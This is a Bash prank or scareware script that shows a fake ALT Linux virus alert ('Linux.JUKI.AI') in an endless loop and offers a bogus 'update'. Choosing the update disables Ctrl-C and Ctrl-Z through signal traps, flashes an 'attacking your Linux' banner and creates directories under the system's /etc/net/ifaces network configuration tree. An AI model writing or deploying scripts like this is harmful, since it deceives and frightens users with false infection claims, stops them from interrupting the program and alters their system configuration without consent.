#!/bin/bash

windows_style() {
    clear
    echo -e "\e[44m\e[97m╔══════════════════════════════════════════╗"
    echo "║               ALT LINUX                 ║"
    echo "║         Системное уведомление           ║"
    echo "╚══════════════════════════════════════════╝\e[0m"
    echo ""
}

while true; do
    windows_style
    echo -e "\e[31mОбнаружен вирус: Linux.JUKI.AI"
    echo "Рекомендуется удалить или обновить ALT Linux"
    echo ""
    echo "Нажмите:"
    echo "1 - Обновить Linux (рекомендуется)"
    
    read -p "Ваш выбор: " choice
    
    case $choice in
        1)
            echo "Запуск деинсталляции Linux"
            echo "Запуск деинсталляции Linux."
            echo "Запуск деинсталляции Linux.."
            echo "Запуск деинсталляции Linux..."
            sleep 3
            trap '' SIGINT SIGTSTP
            pip=0
            pop=60
            while [ $pip -lt 20 ]; do
                clear
                printf "\e[$(($(tput lines)/2));$(($(tput cols)/2-8))f\033[1;31m!!! JUKI ATAKUYUT VASH LINUX !!!\033[0m"
                sleep 0.5
                mkdir -p /etc/net/ifaces/test/empBs$pip
                pip=$((pip + 1))
                pop=$((pop - 1))
                clear
                sleep 0.3
            done
            ;;
        2)
            echo "Ошибка! Невозможно продолжить!"
            sleep 2
            ;;
        3)
            echo "Ошибка доступа! Показывать снова!"
            sleep 2
            ;;
        *)
            echo "Неверный ввод! Система нестабильна!"
            sleep 2
            ;;
    esac
done
